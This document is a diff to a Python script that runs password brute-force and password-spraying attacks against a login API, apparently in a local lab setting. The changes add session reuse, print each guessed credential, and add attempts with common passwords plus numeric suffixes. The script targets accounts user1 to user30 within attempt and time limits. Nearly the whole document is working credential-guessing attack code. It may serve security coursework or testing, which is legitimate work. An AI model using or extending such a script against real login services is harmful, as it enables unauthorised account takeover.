@@ -26,7 +26,7 @@ def get():
         return response.text
 
 
-def post(username, password):
+def post(username, password, session):
     data = {
         'username': username,
         'password': password
@@ -34,7 +34,7 @@ def post(username, password):
     # Post to the login endpoint
     url = f"{LOCAL_ADDRESS}/api/login"
     try:
-        response = requests.post(url, json=data)
+        response = session.post(url, json=data)
     except requests.RequestException as e:
         print(f"Request failed: {e}")
         return None
@@ -44,11 +44,11 @@ def post(username, password):
     content_type = response.headers.get('Content-Type', '')
     if 'application/json' in content_type:
         try:
-            print(response.json())
+            print(response.json(), username, password)
         except ValueError:
             print("Response said JSON but could not parse it")
     else:
-        print(response.text)
+        print(response.text, username, password)
     return response.status_code
 
 
@@ -58,8 +58,10 @@ def brute_force(username):
     max_attempts = 1000000    
     max_seconds = 2 * 3600   # 2 hours in secs
     attempt_count = 0
+    session = requests.Session()
 
     for password in common_passwords:
+        
         #check attempts limit
         if attempt_count >= max_attempts:
             print("Reached maximum attempts limit.")
@@ -70,15 +72,26 @@ def brute_force(username):
         if elapsed_time >= max_seconds:
             print("Reached time limit (2 hours).")
             break
-
+        
+        #check password without suffix
         password = password[:-1]
         print(password, username)
-        answer = post(username, password)
-
-        attempt_count += 1 
-
+        answer = post(username, password, session)
+        attempt_count += 1
         if answer == 200:
-            return 1
+            return 1 
+
+        if password.isalpha():
+            #check password with suffix
+            for length in [1, 2]:
+                for i in range(10**length):
+                    suffix = f"{i:0{length}}"
+                    current_password = password + suffix
+                    answer = post(username, current_password, session)
+                    attempt_count += 1 
+                    if answer == 200:
+                        print(current_password, username)
+                        return 1    
     return 0
 
 def password_sparying(password):
@@ -87,6 +100,7 @@ def password_sparying(password):
     max_attempts = 1000000    
     max_seconds = 2 * 3600   # 2 hours in secs
     attempt_count = 0
+    session = requests.Session()
 
     for i in range(1,31):
         #check attempts limit
@@ -100,7 +114,7 @@ def password_sparying(password):
             print("Reached time limit (2 hours).")
             break
 
-        answer = post(f'user{i}', password)
+        answer = post(f'user{i}', password, session)
 
         attempt_count += 1 
 
@@ -109,13 +123,15 @@ def password_sparying(password):
     return 0
 
 def start_brute_force():
-    for i in range(1,31):
+    #need to choose randomly from each category?
+    #for i in range(11,31):
         try:
-            if brute_force(f'user{i}'):
+            if brute_force(f'user11'):
                 print("hacked!")
-                break
+                #break
         except:
             print('error in sending info to the server')
+
 
 def start_password_spraying():
     common_passwords = load_common_password()
@@ -136,7 +152,8 @@ def start_password_spraying():
 
 
 def main():
-    start_password_spraying()
+    #start_password_spraying()
+    start_brute_force()
 
     
     
